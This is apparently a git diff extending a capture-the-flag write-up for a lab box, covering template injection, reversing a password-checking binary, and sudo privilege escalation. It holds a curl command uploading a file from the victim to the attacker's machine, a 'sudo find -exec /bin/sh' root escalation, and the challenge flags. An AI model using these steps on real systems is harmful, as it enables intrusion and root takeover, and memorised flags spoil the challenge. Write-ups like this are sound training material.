@@ -213,6 +213,12 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 
 So our template engine is : Twig/Jinja2/Unknown  
 
+Acunetix scan find the same vuln  
+
+![image](https://user-images.githubusercontent.com/72421091/146687502-2c72d6f5-2571-4f19-b151-9cb31575b842.png)
+
+
+
 I started with jinja2
 
 http://192.168.1.106/?search={{config.items()}}
@@ -415,4 +421,112 @@ vmlinuz
 vmlinuz.old
 ```
 Let's stabilize the shell ....
+
+I found a file in /home/c3p0
+
+```bash
+www-data@thehackernewsbdarija:/home/c3p0$ ./hackernews
+What is the password?
+```
+
+Send it to my machine using curl : curl -X POST -F "files=@hackernews" http://192.168.1.108:8000/upload
+
+I starting doing some reversing using ghidra
+
+Main
+
+```c
+undefined8 main(void)
+
+{
+  int iVar1;
+  size_t sVar2;
+  long in_FS_OFFSET;
+  char local_38 [40];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  puts("What is the password?");
+  fgets(local_38,0x20,stdin);
+  sVar2 = strcspn(local_38,"\r\n");
+  local_38[sVar2] = '\0';
+  iVar1 = strcmp(local_38,"the password");
+  if (iVar1 == 0) {
+    puts("Vs3_l4ev3v_n33e_T4uDa0tO");
+  }
+  else {
+    puts("Password incorrect!");
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+
+As we can see the password is "the password" and the secret output is "Vs3_l4ev3v_n33e_T4uDa0tO"
+
+Note : it's was the first version of the box the second one has the secret Th3_h4ck3r_l33t_P4sSw0rD! 
+To do : decrypt the cipher from v1
+
+User flag : thnb{m4b9a_w4l0_4lm0jt4h1D}
+
+It's probably the password for the user c3p0 let's ssh
+
+### Privsec
+
+c3p0@thehackernewsbdarija:~$ sudo -l
+Matching Defaults entries for c3p0 on thehackernewsbdarija:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User c3p0 may run the following commands on thehackernewsbdarija:
+    (ALL : ALL) NOPASSWD: /usr/bin/find
+c3p0@thehackernewsbdarija:~$
+
+https://gtfobins.github.io/gtfobins/find/
+
+```bash
+c3p0@thehackernewsbdarija:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
+# ls
+flag.txt  hackernews
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# hostname
+thehackernewsbdarija
+# ls -la
+total 56
+drwxr-xr-x 6 c3p0     c3p0      4096 Dec 17 12:27 .
+drwxr-xr-x 3 root     root      4096 Dec 17 12:34 ..
+lrwxrwxrwx 1 c3p0     c3p0         9 Dec 17 11:54 .bash_history -> /dev/null
+-rw-r--r-- 1 c3p0     c3p0       220 Dec 17 11:52 .bash_logout
+-rw-r--r-- 1 c3p0     c3p0      3771 Dec 17 11:52 .bashrc
+drwx------ 2 c3p0     c3p0      4096 Dec 17 12:20 .cache
+drwx------ 3 c3p0     c3p0      4096 Dec 17 12:12 .gnupg
+drwxrwxr-x 3 c3p0     c3p0      4096 Dec 17 12:12 .local
+-rw-r--r-- 1 c3p0     c3p0       807 Dec 17 11:52 .profile
+drwxr-xr-x 2 c3p0     c3p0      4096 Dec 17 12:27 .ssh
+-rw-r----- 1 c3p0     c3p0        29 Dec 17 12:04 flag.txt
+-rwxrwxrwx 1 www-data www-data 16344 Dec 17 12:01 hackernews
+# cd /root
+# ls -la
+total 36
+drwx------  6 root root 4096 Dec 17 12:33 .
+drwxr-xr-x 25 root root 4096 Dec 19 14:37 ..
+lrwxrwxrwx  1 root root    9 Dec 17 12:33 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Dec 17 12:32 .cache
+drwx------  3 root root 4096 Dec 17 12:32 .gnupg
+drwxr-xr-x  3 root root 4096 Dec 17 11:40 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Dec 17 11:19 .ssh
+-rw-r--r--  1 root root   37 Dec 17 12:16 flag.txt
+# cat flag.txt
+thnb{br4v0_4kh4y_lH4ck3r_y0u_d1D_1t}
+#
+```
+
 
